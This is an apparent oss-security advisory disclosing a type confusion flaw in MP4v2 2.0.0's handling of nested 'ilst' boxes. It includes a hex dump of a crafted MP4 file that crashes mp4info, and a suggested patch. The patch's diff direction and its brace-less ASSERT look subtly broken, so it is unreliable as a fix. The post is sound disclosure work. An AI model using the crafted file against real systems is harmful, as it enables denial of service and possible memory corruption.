@@ -1,0 +1,181 @@
+
+Date: Tue, 17 Jul 2018 14:30:48 +0800
+From: Ruikai Liu <lrk700@...il.com>
+To: oss-security@...ts.openwall.com
+Subject: Type confusion in MP4v2 2.0.0
+
+Hi,
+
+A type confusion bug is found in MP4v2 2.0.0, a legacy library dealing
+with MP4 media file.
+
+========= ilst box =========
+
+According to ref[2], MP4 file could contain an `ilst` box, which
+stands for item list. Tags such as album, author, etc., are stored
+here. A typical `ilst` box looks like this:
+
+[ilst box] --> [nam box(full name)] -> [data box]
+         |---> [cmt box(comment)] -> [data box]
+         |---> [day box(created time)] -> [data box]
+         ...
+
+MP4v2 would use `MP4ItemAtom` for nam/cmt/... box, and `MP4DataAtom`
+for data box:
+
+ 772 MP4Atom*
+ 773 MP4Atom::factory( MP4File &file, MP4Atom* parent, const char* type )
+ 774 {
+ 775     // type may be NULL only in case of root-atom
+ 776     if( !type )
+ 777         return new MP4RootAtom(file);
+ 778
+ 779     // construct atoms which are context-savvy
+ 780     if( parent ) {
+ 781         const char* const ptype = parent->GetType();
+ 782
+ 783         if( descendsFrom( parent, "ilst" )) {
+ 784             if( ATOMID( ptype ) == ATOMID( "ilst" ))
+ 785                 return new MP4ItemAtom( file, type );
+ 786
+ 787             if( ATOMID( type ) == ATOMID( "data" ))
+ 788                 return new MP4DataAtom(file);
+
+However, if a crafted MP4 file has the following structure:
+
+[ilst box] -> [ilst box] -> [data box]
+
+Then `MP4ItemAtom` would be created for the data box instead of
+`MP4DataAtom`, since its parent is still of type `ilst`.
+
+========= type confusion =========
+
+Now, to parse the tag info of the MP4 file, `Tags::c_fetch` is called,
+which invokes `genericGetItems`:
+
+293 MP4ItmfItemList*
+294 genericGetItems( MP4File& file )
+295 {
+296     MP4Atom* ilst = file.FindAtom( "moov.udta.meta.ilst" );
+297     if( !ilst )
+298         return __itemListAlloc();
+299
+300     const uint32_t itemCount = ilst->GetNumberOfChildAtoms();
+301     if( itemCount < 1 )
+302         return __itemListAlloc();
+303
+304     MP4ItmfItemList& list = *__itemListAlloc();
+305     __itemListResize( list, itemCount );
+306
+307     for( uint32_t i = 0; i < list.size; i++ )
+308         __itemAtomToModel( *(MP4ItemAtom*)ilst->GetChildAtom( i ),
+list.elements[i] );
+309
+310     return &list;
+311 }
+
+Here we first find the atom for `ilst`, and then iterate its child
+atoms. Remember that there's a duplicate `ilst` in the crafted MP4
+file, in which case the root `ilst` atom's child is a `MP4ItemAtom` of
+type `ilst`, and its grandchild is a `MP4ItemAtom` of type `data`.
+
+Then in the function `__itemAtomToModel`, the `MP4ItemAtom` of type
+`ilst` is parsed:
+
+153 static bool
+154 __itemAtomToModel( MP4ItemAtom& item_atom, MP4ItmfItem& model )
+...
+193     // pass 2: populate data model
+194     for( uint32_t i = 0, idata = 0; i < childCount; i++ ) {
+195         MP4Atom* atom = item_atom.GetChildAtom( i );
+196         if( ATOMID( atom->GetType() ) != ATOMID( "data" ))
+197             continue;
+198
+199         MP4DataAtom& data_atom = *(MP4DataAtom*)atom;
+
+We can see that line 199 would cast its child to `MP4DataAtom`
+directly, which in fact is a `MP4ItemAtom`. Since these two objects
+are of different layout, operations on the `data_atom` could lead to
+memory corruption due to the type confusion.
+
+========= POC =========
+
+Here we create a MP4 file with two `ilst`s:
+
+root@...ian:~# xxd c3.mp4
+00000000: 0000 0018 6674 7970 6d70 3432 0000 0000  ....ftypmp42....
+00000010: 6d70 3432 6973 6f6d 0000 00b8 6d6f 6f76  mp42isom....moov
+00000020: 0000 006c 6d76 6864 0000 0000 1234 5678  ...lmvhd.....4Vx
+00000030: 2345 6789 0000 0258 9876 5432 0987 6543  #Eg....X.vT2..eC
+00000040: 5600 0000 0000 0000 0000 0000 0000 0000  V...............
+00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000080: 0000 0000 0000 0000 dead beef 0000 0044  ...............D
+00000090: 7564 7461 0000 003c 6d65 7461 0000 0000  udta...<meta....
+000000a0: 0000 0030 696c 7374 0000 0028 696c 7374  ...0ilst...(ilst
+000000b0: 0000 0008 6461 7461 0000 0008 6461 7461  ....data....data
+000000c0: 0000 0008 6461 7461 0000 0008 6461 7461  ....data....data
+
+It results in segfault when running `mp4info`:
+
+root@...ian:~# mp4info c3.mp4
+mp4info version -r
+c3.mp4:
+ReadChildAtoms: "c3.mp4": In atom data missing child atom data
+ReadChildAtoms: "c3.mp4": In atom data missing child atom data
+ReadChildAtoms: "c3.mp4": In atom data missing child atom data
+ReadChildAtoms: "c3.mp4": In atom data missing child atom data
+ReadChildAtoms: "c3.mp4": In atom meta missing child atom hdlr
+ReadChildAtoms: "c3.mp4": In atom moov missing child atom trak
+Track   Type    Info
+ReadChildAtoms: "c3.mp4": In atom data missing child atom data
+ReadChildAtoms: "c3.mp4": In atom data missing child atom data
+ReadChildAtoms: "c3.mp4": In atom data missing child atom data
+ReadChildAtoms: "c3.mp4": In atom data missing child atom data
+ReadChildAtoms: "c3.mp4": In atom meta missing child atom hdlr
+ReadChildAtoms: "c3.mp4": In atom moov missing child atom trak
+Segmentation fault
+
+root@...ian:~#
+root@...ian:~# dpkg -s mp4v2-utils
+Package: mp4v2-utils
+Status: install ok installed
+Priority: optional
+Section: sound
+Installed-Size: 300
+Maintainer: Debian Multimedia Maintainers
+<pkg-multimedia-maintainers@...ts.alioth.debian.org>
+Architecture: amd64
+Source: mp4v2 (2.0.0~dfsg0-5)
+Version: 2.0.0~dfsg0-5+b1
+Depends: libmp4v2-2 (= 2.0.0~dfsg0-5+b1), libc6 (>= 2.14), libgcc1 (>=
+1:3.0), libstdc++6 (>= 5.2)
+
+========= fix =========
+
+The bug is caused by the wrong assumption that the child of an `ilst`
+can never be an `ilst`. So we could fix it by simply adding an ASSERT:
+
+--- src/mp4atom.cpp     2018-07-17 11:37:01.266702613 +0800
++++ ../mp4v2-2.0.0-orig/src/mp4atom.cpp 2018-07-17 14:20:54.986316212 +0800
+@@ -783,6 +783,7 @@
+
+         if( descendsFrom( parent, "ilst" )) {
+             if( ATOMID( ptype ) == ATOMID( "ilst" ))
+-                ASSERT(ATOMID( type ) != ATOMID( "ilst" ));
+                 return new MP4ItemAtom( file, type );
+
+             if( ATOMID( type ) == ATOMID( "data" )) {
+
+
+
+========= Reference =========
+
+[1] https://code.google.com/archive/p/mp4v2/
+[2] http://xhelmboyx.tripod.com/formats/mp4-layout.txt
+
+-- 
+Best regards,
+
+Ruikai Liu
